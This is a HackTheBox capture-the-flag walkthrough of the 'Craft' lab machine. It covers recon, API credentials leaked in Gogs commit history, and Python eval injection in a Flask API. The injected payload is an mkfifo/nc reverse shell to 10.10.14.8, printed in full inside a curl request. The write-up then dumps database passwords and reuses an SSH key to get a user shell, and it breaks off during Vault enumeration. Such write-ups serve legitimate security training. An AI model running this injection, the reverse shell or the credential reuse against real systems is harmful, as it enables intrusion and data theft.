---
title: HTB: Craft
url: https://0xdf.gitlab.io/2020/01/04/htb-craft.html
date: 2020-01-04T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-craft, nmap, gogs, api, wfuzz, flask, python, python-eval, git, ssh, hashicvault, jwt, john, jwtcat
---

![Craft](https://0xdfimages.gitlab.io/img/craft-cover.png)

Craft was a really well designed medium box, with lots of interesting things to poke at, none of which were too difficult. I’ll find credentials for the API in the Gogs instance, as well as the API source, which allows me to identify a vulnerability in the API that gives code execution. Then I’ll use the shell on the API container to find creds that allow me access to private repos back on Gogs, which include an SSH key. With SSH access to the host, I’ll target the vault project software to get SSH access as root. In Beyond Root, I’ll look at the JWT, and my failed attempts to crack the secret.

## Box Info

| Name | [Craft](https://hackthebox.com/machines/craft)  [Craft](https://hackthebox.com/machines/craft) [Play on HackTheBox](https://hackthebox.com/machines/craft) |
| --- | --- |
| Release Date | [13 Jul 2019](https://twitter.com/hackthebox_eu/status/1148894246507831296) |
| Retire Date | 04 Jan 2020 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Craft |
| Radar Graph | Radar chart for Craft |
| First Blood User | 00:48:11[t0ny t0ny](https://app.hackthebox.com/users/60055) |
| First Blood Root | 00:57:10[sampriti sampriti](https://app.hackthebox.com/users/836) |
| Creator | [rotarydrone rotarydrone](https://app.hackthebox.com/users/3067) |

## Recon

### nmap

`nmap` reveals three open ports, HTTPS (TCP 443) and two SSH (22 and 6022):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/alltcp 10.10.10.110
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-13 15:07 EDT
Nmap scan report for 10.10.10.110                                                                        
Host is up (0.033s latency).                                
Not shown: 65532 closed ports                              
PORT     STATE SERVICE                                                
22/tcp   open  ssh                                
443/tcp  open  https                                                  
6022/tcp open  x11                                                  
                                                         
Nmap done: 1 IP address (1 host up) scanned in 9.53 seconds 

root@kali# nmap -sC -sV -p 22,443,6022 -oA scans/tcp-scripts 10.10.10.110                                                                                                                  
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-13 15:09 EDT
Nmap scan report for 10.10.10.110
Host is up (0.031s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp  open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: About
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
6022/tcp open  ssh      (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6022-TCP:V=7.70%I=7%D=7/13%Time=5D2A2C5E%P=x86_64-pc-linux-gnu%r(NU
SF:LL,C,"SSH-2\.0-Go\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.36 seconds

```

I’ll notice the TLS certificate name of `craft.htb`, and add that to my `/etc/hosts` file. Looking at two SSH ports, this suggests I might find containers on this host. The port 22 SSH looks like [Debian 9 (Stretch)](https://packages.debian.org/search?keywords=openssh-server). I’ve not seen the port 6022 SSH version before, but it does match [this SSH server written in Go](https://github.com/viking/go-ssh/blob/master/server.go).

### craft.htb - TCP 443

The site page is for a beer company, and it returns the same page by IP and domain name. There’s not too much there:

![1563167853230](https://0xdfimages.gitlab.io/img/1563167853230.png)

There are two links at the top right that lead to new subdomains: `https://api.craft.htb/api/` and `https://gogs.craft.htb/`. I’ll add each of those to my `hosts` file.

I ran `gobuster` against the site, but didn’t find anything useful.

### Fuzz Subdomains

Given the existence of these two subdomains, I decided to fuzz for more, and found one more, `vault`:

```

root@kali# wfuzz -u "https://10.10.10.110" -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-20000.txt  -H "Host: FUZZ.craft.htb" --hh 3779                                                                 
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.10.110/
Total requests: 19983

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000051:  C=404      4 L       34 W          233 Ch        "api"
005943:  C=404      1 L        4 W           19 Ch        "vault"

Total time: 432.5084
Processed Requests: 19983
Filtered Requests: 19981
Requests/sec.: 46.20256

```

I’ll add it to my `/etc/hosts`:

```
10.10.10.110 craft.htb api.craft.htb gogs.craft.htb vault.craft.htb

```

### api.craft.htb

This site contains a GUI for the api for the company:

![1563168889623](https://0xdfimages.gitlab.io/img/1563168889623.png)

For each API endpoint, I can provide inputs and run them, and see the output. It also provides `curl` commands. Almost all of the results return something like:

```

{
  "message": "Invalid token or no token found."
}

```

When I try the `/auth/login` endpoint, HTTP Basic Auth pops up:

![1563169108445](https://0xdfimages.gitlab.io/img/1563169108445.png)

I’ll keep that in mind when I find some credentials.

### gogs.craft.htb

#### Site

`gogs.craft.api` is an instance of [Gogs](https://gogs.io/) is a self-hosted Git service:

![1563169413185](https://0xdfimages.gitlab.io/img/1563169413185.png)

Clicking “Explore” shows me one repo:

![1563169495795](https://0xdfimages.gitlab.io/img/1563169495795.png)

Clicking the repo takes me to the page with the code:

![1563169563946](https://0xdfimages.gitlab.io/img/1563169563946.png)

I can walk through the code and give it a review. There’s a lot there, but I have a few major take-aways.

#### settings.py

I wanted to understand how the api handles credentials, both from the user and for logging into any kind of database backend. In `app.py` at the project root, there is an import line for `from craft_api import settings`, and then a bunch of references to `settings` where constants are loaded:

```

import os
from flask import Flask, Blueprint
from werkzeug.contrib.fixers import ProxyFix
from craft_api import settings
from craft_api.api.auth.endpoints.auth import ns as craft_auth_namespace
from craft_api.api.brew.endpoints.brew import ns as craft_brew_namespace
from craft_api.api.restplus import api
from craft_api.database import db

app = Flask(__name__)

def configure_app(flask_app):
    flask_app.config['SERVER_NAME'] = settings.FLASK_SERVER_NAME
    flask_app.config['SWAGGER_UI_DOC_EXPANSION'] = settings.RESTPLUS_SWAGGER_UI_DOC_EXPANSION
    flask_app.config['RESTPLUS_VALIDATE'] = settings.RESTPLUS_VALIDATE
    flask_app.config['RESTPLUS_MASK_SWAGGER'] = settings.RESTPLUS_MASK_SWAGGER
    flask_app.config['ERROR_404_HELP'] = settings.RESTPLUS_ERROR_404_HELP
    flask_app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://%s:%s@%s/%s' % ( settings.MYSQL_DATABASE_USER, settings.MYSQL_DATABASE_PASSWORD, settings.MYSQL_DATABASE_HOST, settings.MYSQL_DATABASE_DB)
    flask_app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = settings.SQLALCHEMY_TRACK_MODIFICATIONS

def initialize_app(flask_app):
    configure_app(flask_app)

    blueprint = Blueprint('api', __name__, url_prefix='/api')
    api.init_app(blueprint)
    api.add_namespace(craft_auth_namespace)
    api.add_namespace(craft_brew_namespace)
    flask_app.register_blueprint(blueprint)
    flask_app.wsgi_app = ProxyFix(app.wsgi_app)

    db.init_app(flask_app)

def main():
    initialize_app(app)
    app.run(host='0.0.0.0', port=8888, debug=settings.FLASK_DEBUG)

if __name__ == "__main__":
    main()

```

This means there should be a file `craft_api/settings.py` which holds all these details. But there isn’t one:

![1563170049593](https://0xdfimages.gitlab.io/img/1563170049593.png)

Back in the root folder, there’s a `.gitignore` file, which tells `git` which files not to include. Unfortunately, `settings.py` is in there:

```
    *.pyc
    settings.py

```

This indicates that the `settings.py` file isn’t added to git, and explains why it isn’t present in this repo.

#### Issues

Next I turned to the issues. There’s one active, and one closed:

[![Issues page](https://0xdfimages.gitlab.io/img/1563170168976.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1563170168976.png)

Clicking on the “Bogus ABV values” issue, I can see a conversation about the issue:

[![Open Issue](https://0xdfimages.gitlab.io/img/1563170218453.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1563170218453.png)

Two interesting things here:
- The example query is useful because it shows how to include the auth token in a `curl` command:

  ```

  curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'

  ```

  It also includes a token. That specific token ends up being useless, but I went down several rabbit holes trying to use this, which I’ll talk about in Beyond Root.
- |  |
  | --- |
  | The code that is pushed to fix this issue. Dinesh says he fixed it and gives a link to the commit. Bertram calls that code a “sorry excuse for a "patch"” and says to remove it before “something awful happens”. Clicking on the commit link shows the changes in the code: |

[![Issue fix code](https://0xdfimages.gitlab.io/img/1563170600459.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1563170600459.png)

There’s an `eval` statement which is running on input from the request, which the user controls. This is definitely a vulnerability, and something I should be able to exploit to get code execution if I can find creds.

#### Tests

In the project root there’s a `tests` directory, which holds `tests.py`:

```

#!/usr/bin/env python

import requests
import json

response = requests.get('https://api.craft.htb/api/auth/login',  auth=('', ''), verify=False)
json_response = json.loads(response.text)
token =  json_response['token']

headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }

# make sure token is valid
response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
print(response.text)

# create a sample brew with bogus ABV... should fail.

print("Create bogus ABV brew")
brew_dict = {}
brew_dict['abv'] = '15.0'
brew_dict['name'] = 'bullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style'] = 'bullshit'

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)

# create a sample brew with real ABV... should succeed.
print("Create real ABV brew")
brew_dict = {}
brew_dict['abv'] = '0.15'
brew_dict['name'] = 'bullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style'] = 'bullshit'

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)

```

The first thing the script does it try to authenticate using empty creds. This script doesn’t import anything from the project, so I can actually run it myself to see if it works. I wouldn’t expect it to, and it doesn’t:

```

root@kali# python tests.py 
/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:849: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
  InsecureRequestWarning)
Traceback (most recent call last):
  File "tests.py", line 7, in <module>
    json_response = json.loads(response.text)
  File "/usr/lib/python2.7/json/__init__.py", line 339, in loads
    return _default_decoder.decode(s)
  File "/usr/lib/python2.7/json/decoder.py", line 364, in decode
    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
  File "/usr/lib/python2.7/json/decoder.py", line 382, in raw_decode
    raise ValueError("No JSON object could be decoded")
ValueError: No JSON object could be decoded

```

It fails on `json.loads(response.text)`. The response is returning a failed auth, and then the code is trying to load that as json, which it doesn’t have because of the failed login. I can show this with `pdb`:

```

root@kali# python -m pdb tests.py 
> /media/sf_CTFs/hackthebox/craft-10.10.10.110/tests.py(3)<module>()
-> import requests
(Pdb) b 7
Breakpoint 1 at /media/sf_CTFs/hackthebox/craft-10.10.10.110/tests.py:7
(Pdb) c
/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:849: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
  InsecureRequestWarning)
> /media/sf_CTFs/hackthebox/craft-10.10.10.110/tests.py(7)<module>()
-> json_response = json.loads(response.text)
(Pdb) !response.text
u'Authentication failed'

```

First I set a break point at line 7, where the API call has just returned and been stored in `response`, and the code is about to run `json.loads(response.text)`. I enter `c` to continue, where it will run until that break point. Then I print the value of `response.text`, which is clearly not JSON. That’s why it will crash here.

If I click on “History” for the file, I’ll see two commits, the current one and the original one:

![1563171195616](https://0xdfimages.gitlab.io/img/1563171195616.png)

I’ll click on the current one to see what changed:

[![Found creds in commit](https://0xdfimages.gitlab.io/img/1563171230866.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1563171230866.png)

It seems dinesh originally had his creds in the file. I’ll update a local copy of `tests.py`, and confirm they work (removing insecure request warnings with `2>&1` to push stderr to stdout and `grep -v InsecureRequestWarning` to ignore those lines):

```

root@kali# python tests-creds.py 2>&1 | grep -v InsecureRequestWarning
{"message":"Token is valid!"}

Create bogus ABV brew
"ABV must be a decimal value less than 1.0"

Create real ABV brew
null

```

### vault.craft.htb

#### Site

Visiting the page just returns 404:

```

root@kali# curl -s -k https://vault.craft.htb
404 page not found

```

#### gobuster

`gobuster` does return one path:

```

root@kali# gobuster dir -k -u https://vault.craft.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -o scans/gobuster_vault.craft.htb_root                          
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://vault.craft.htb
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/07/16 02:14:44 Starting gobuster
===============================================================
/v1 (Status: 301)
===============================================================
2019/07/16 02:20:27 Finished
===============================================================

```

#### /v1

This path returns json, and the path name looks like an API:

```

root@kali# curl -k -s https://vault.craft.htb/v1/
{"errors":[]}

```

I could start to fuzz this out, but given the promising lead I have on RCE with `api.craft.htb`, I’m going to stop here and pursue that. Should I get stuck, this is definitely a place to look.

## Shell as root@api Container

### Interacting with the API

I need to be able to interact with the api. I’ll start by trying to login with dinesh’s credentials. I’ll take the example from the api page, and try to run it:

```

root@kali# curl -X GET "https://api.craft.htb/api/auth/login" -H  "accept: application/json"
curl: (60) SSL certificate problem: unable to get local issuer certificate
More details here: https://curl.haxx.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the web page mentioned above.
root@kali# curl -k -X GET "https://api.craft.htb/api/auth/login" -H  "accept: application/json"
Authentication failed

```

The first time it failed because of the TLS certificate. I added `-k`, but it fails again. Since it’s trying to do HTTP basic auth, I’ll add the creds into the url using the formal `https://[user]:[password]@[url]`. It works, returning an auth token:

```

root@kali# curl -k -X GET "https://dinesh:4aUh0A8PbVJxgd@api.craft.htb/api/auth/login" -H  "accept: application/json"
{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTYzMTcyMjYwfQ.S5iVA7qtkjx4C0avPU2BvbOMcL0obW-mOB85IAgHnGw"}

```

Next I’ll try the `/auth/check` endpoint to make sure I can submit requests. I’ll grab the example from the api webpage, and add `-k` and `-H "X-CRAFT-API-TOKEN: eyJ0eXAiO..."` as I saw in the example and `tests.py`:

```

root@kali# curl -X GET -k -H "X-CRAFT-API-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTYzMTcyMjYwfQ.S5iVA7qtkjx4C0avPU2BvbOMcL0obW-mOB85IAgHnGw" "https://api.craft.htb/api/auth/check" -H  "accept: application/json"
{"message":"Token is valid!"}

```

Finally, I need to make sure I can submit a new beer, since that’s where the vulnerability is. The example from POST `/brew/` is:

```

curl -X POST "https://api.craft.htb/api/brew/" -H  "accept: application/json" -H  "Content-Type: application/json" -d "{  \"id\": 0,  \"brewer\": \"string\",  \"name\": \"string\",  \"style\": \"string\",  \"abv\": \"string\"}"

```

I’ll update it with some dummy values, and add `-k` and the token header to get:

```

root@kali# curl -X POST "https://api.craft.htb/api/brew/" -H  "accept: application/json" -H  "Content-Type: application/json" -d "{
\"id\": 0,
\"brewer\": \"0xdf\",
\"name\": \"beer\",
\"style\": \"bad\",
\"abv\": \"0.1\"}" -k -H "X-CRAFT-API-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTYzMTcyNjI5fQ.Tjz0vRHpVRu3GGR1031uCMM4MihwZzHPx6CuGNCodGo"
null

```

I can use the GET method for this same endpoint to see it works. First I’ll get page one, see at the bottom the number of pages, which is 1171 in my case. Then I’ll issue the request again with `page=1171`, and it returns my added beer:

```

root@kali# curl -s -X GET "https://api.craft.htb/api/brew/?page=1171&bool=true&per_page=2" -H  "accept: application/json" -k | jq .
{
  "items": [
    {
      "id": 2352,
      "brewer": "0xdf",
      "name": "beer",
      "style": "bad",
      "abv": "0.100"
    }
  ],
  "page": 1171,
  "pages": 1171,
  "per_page": 2,
  "total": 2341
}

```

One other thing I noticed: after a few minutes, my requests would go back to `Invalid token or no token found.`. That’s because in [auth.py](https://gogs.craft.htb/Craft/craft-api/src/master/craft_api/api/auth/endpoints/auth.py) the jwt is set to be valid for 5 minutes:

```

token = jwt.encode({'user': auth.username, 'exp' : datetime.datetime.utcnow() + datetime.timedelta(minutes=5)}, secret)

```

To get around this, I just had bash get me a token every time I wanted to run a command. I can get and save a token like this:

```

root@kali# TOKEN=$(curl -s -k -X GET "https://dinesh:4aUh0A8PbVJxgd@api.craft.htb/api/auth/login" -H  "accept: application/json" | jq -r '.token'); echo $TOKEN
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTYzMTczMjE3fQ.ssgEpcD1ny20yHo_aiOaypm0Th1Eqk97ap1yIDRvBTk

```

So now I can just replace `echo $TOKEN` with the next `curl` command I want to run:

```

root@kali# TOKEN=$(curl -s -k -X GET "https://dinesh:4aUh0A8PbVJxgd@api.craft.htb/api/auth/login" -H  "accept: application/json" | jq -r '.token'); \
> curl "https://api.craft.htb/api/auth/check" -H  "accept: application/json" -k -H "X-CRAFT-API-TOKEN: $TOKEN"
{"message":"Token is valid!"}

```

### Abusing Python eval Statements

The `eval` statement in `python` let’s one run a string as python. [This post](https://www.floyd.ch/?p=584) has a pretty good detailed write up on it, though it goes into way more difficult cases than this one. From that post, I’ll grab the following:

```

__import__('os').system('echo hello, I am a command execution')

```

I’ll test that in a `python` shell:

```

root@kali# python3
Python 3.7.3 (default, Apr  3 2019, 05:39:12) 
[GCC 8.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> s = "__import__('os').system('echo hello, I am a command execution')"
>>> eval(s)
hello, I am a command execution
0

```

Now I’ll check that with the code from gogs, putting `s` where the code has `requests.json['abv']`:

```

>>> eval('%s > 1' % s)
hello, I am a command execution
False

```

Great. Still execution. I want to get a reverse shell. As always, I’ll turn to the [Pentest Monkey cheat sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). In this case, I’ll go with the `mkfifo` shell, which is especially nice in this case since it doesn’t have any `"` or `'` to worry about nesting. I’ll test it locally to make sure I have the syntax correct, and it works:

```

>>> s = "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f')"
>>> eval('%s > 1' % s)
rm: cannot remove '/tmp/f': No such file or directory

```

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.14.8.
Ncat: Connection from 10.10.14.8:48958.
# id
uid=0(root) gid=0(root) groups=0(root)

```

### Shell

Now I’ll just replace the `abv` value from the successful beer POST with the `python` injection code and get a shell as root:

```

root@kali# TOKEN=$(curl -s -k -X GET "https://dinesh:4aUh0A8PbVJxgd@api.craft.htb/api/auth/login" -H  "accept: application/json" | jq -r '.token'); \
curl -X POST "https://api.craft.htb/api/brew/" -H  "accept: application/json" -H  "Content-Type: application/json" -d "{
\"id\": 0,
\"brewer\": \"0xdf\",
\"name\": \"beer\",
\"style\": \"bad\",
\"abv\": \"__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f')\"}" -k -H "X-CRAFT-API-TOKEN: $TOKEN"

```

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.110.
Ncat: Connection from 10.10.10.110:37785.
/bin/sh: can't access tty; job control turned off
/opt/app # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

```

Looks like it’s a container:

```

/opt/app # hostname
5a3d243127f5
/opt/app # ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
15: eth0@if16: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:14:00:06 brd ff:ff:ff:ff:ff:ff
    inet 172.20.0.6/16 brd 172.20.255.255 scope global eth0
       valid_lft forever preferred_lft forever

```

## Shell as gilfoyle@craft

### Local Enumeration

It’s quickly obvious there’s almost nothing on this box. `/opt/app` holds the API code from gogs:

```

/opt/app # ls
app.py     craft_api  dbtest.py  tests

```

`settings.py` is there, which gives me creds to the database, as well as the API key for signing JWTs:

```

/opt/app/craft_api # ls
__init__.py  __pycache__  api          database     settings.py
/opt/app/craft_api # cat settings.py 
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
SQLALCHEMY_TRACK_MODIFICATIONS = False

```

There are no home dirs, and `/root` is empty. Besides stuff I started, the process list is basically `python` running the api app:

```

~ # ps auxww
PID   USER     TIME  COMMAND
    1 root      8:57 python ./app.py
   71 root      0:00 sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|n
   74 root      0:00 cat /tmp/f
   75 root      0:00 /bin/sh -i
   76 root      0:00 nc 10.10.14.8 443
 7186 root      0:00 python -c import pty;pty.spawn("sh")
 7187 root      0:00 sh
 7204 root      0:00 ps auxww
12925 root      0:00 [sh]
13251 root      0:01 [GQzvn]
13256 root      0:00 [ping]
13275 root      0:00 [GCpGS]
13290 root      0:01 [vvQnJ]
13295 root      0:00 [sh]
13308 root      0:00 [ash]
13388 root      0:00 [ibOSe]

```

### Database Enumeration

#### Connecting

With the db creds, I wanted to see what else was in the database. But I lacked the tooling. `mysql` wasn’t on the box. Getting tunnels to and from the box were also difficult (surely solvable, but would have been a pain).

So I opted to use `python` and the scripts on the box. There’s a `dbtests.py` script in the app root:

```

#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
        cursor.execute(sql)
        result = cursor.fetchone()
        print(result)

finally:
    connection.close()

```

It handles the connection, and then runs a specific query. I made a copy. I’ll need to have in the same folder as my script a folder `craft_api` with `settings.py` in it. I’ll just work out of the same directory, but I could have created the file structure in `/dev/shm` or elsewhere as well.

```

/opt/app # cp dbtest.py .dbtest.py

```

Now I made a slight edit to run whatever query I pass in by, importing `sys`, changing the `sql` definition to `sys.argv[1]`, and changing `fetchone()` to `fetchall()`:

```

#!/usr/bin/env python

import pymysql
import sys                              
from craft_api import settings
                                   
# test connection to mysql database
                                                               
connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,        
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,         
                             cursorclass=pymysql.cursors.DictCursor)
    
try:                                   
    with connection.cursor() as cursor:                                 
        sql = sys.argv[1]
        cursor.execute(sql)       
        result = cursor.fetchall()
        print(result)
        
finally:              
    connection.close()

```

It works:

```

/opt/app # python .dbtest.py  'SELECT user()'
[{'user()': 'craft@172.20.0.6'}]

```

#### Enumeration

I can get a list of the databases, and there’s only one interesting one, `craft`:

```

/opt/app # python .dbtest.py  "SELECT schema_name FROM information_schema.schemata;"
[{'SCHEMA_NAME': 'information_schema'}, {'SCHEMA_NAME': 'craft'}]

```

The `craft` db has two tables:

```

/opt/app # python .dbtest.py  "SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'"
[{'TABLE_SCHEMA': 'craft', 'TABLE_NAME': 'brew'}, {'TABLE_SCHEMA': 'craft', 'TABLE_NAME': 'user'}]

```

I knew `brew` from the api, but `user` is new. It has three entries:

```

/opt/app # python .dbtest.py  "SELECT * from user"
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]

```

The dinesh password matches what I had found in gogs, but the other two are new.

### Gogs

I tried the new passwords on SSH (both 22 and 6022), didn’t succeed in either. Next, I tried to log into Gogs, and the creds for gilfoyle worked, and showed an additional private repo:

![1563221814693](https://0xdfimages.gitlab.io/img/1563221814693.png)

There’s a bunch of stuff in here, but the first thing I notice is the `.ssh` folder:

[![ssh folder](https://0xdfimages.gitlab.io/img/1563257028639.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1563257028639.png)

In it, there’s a public/private key pair:

![1563257967001](https://0xdfimages.gitlab.io/img/1563257967001.png)

I’ll save them to my local machine.

### SSH

Now I’ll try to ssh into craft as gilfoyle, but the key is encrypted, as it asks for a passphrase:

```

root@kali# ssh -i ~/id_rsa_craft_gilfoyle gilfoyle@10.10.10.110

  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/

Enter passphrase for key '/root/id_rsa_craft_gilfoyle': 

```

Luckily, the password from the database, `ZEU3N8WNM2rh4T`, works:

```

Enter passphrase for key '/root/id_rsa_craft_gilfoyle':
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jul 16 02:22:43 2019 from 10.10.14.8
gilfoyle@craft:~$ id
uid=1001(gilfoyle) gid=1001(gilfoyle) groups=1001(gilfoyle)

```

And with this shell I can grab `user.txt`:

```

gilfoyle@craft:~$ cat user.txt
bbf4b0ca************************

```

## Shell as root@craft

### Enumerate Craft

With shell as gilfoyle, I can look around, and I find a couple interesting things, each with references to “vault”.

In the environment variables, there’s a `VAULT_ADDRESS` value:

```

gilfoyle@craft:~$ env
SSH_CONNECTION=10.10.14.8 57964 10.10.10.110 22
LANG=en_US.UTF-8
XDG_SESSION_ID=792
USER=gilfoyle
PWD=/home/gilfoyle
HOME=/home/gilfoyle
SSH_CLIENT=10.10.14.8 57964 22
SSH_TTY=/dev/pts/0
MAIL=/var/mail/gilfoyle
TERM=screen
SHELL=/bin/bash
VAULT_ADDR=https://vault.craft.htb:8200/
SHLVL=1
LOGNAME=gilfoyle
XDG_RUNTIME_DIR=/run/user/1001
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
_=/usr/bin/env

```

There’s also a `.vault-token` file in gilfoyle’s home dir:

```

gilfoyle@craft:~$ ls -la
total 36
drwx------ 4 gilfoyle gilfoyle 4096 Feb  9 22:46 .
drwxr-xr-x 3 root     root     4096 Feb  9 10:46 ..
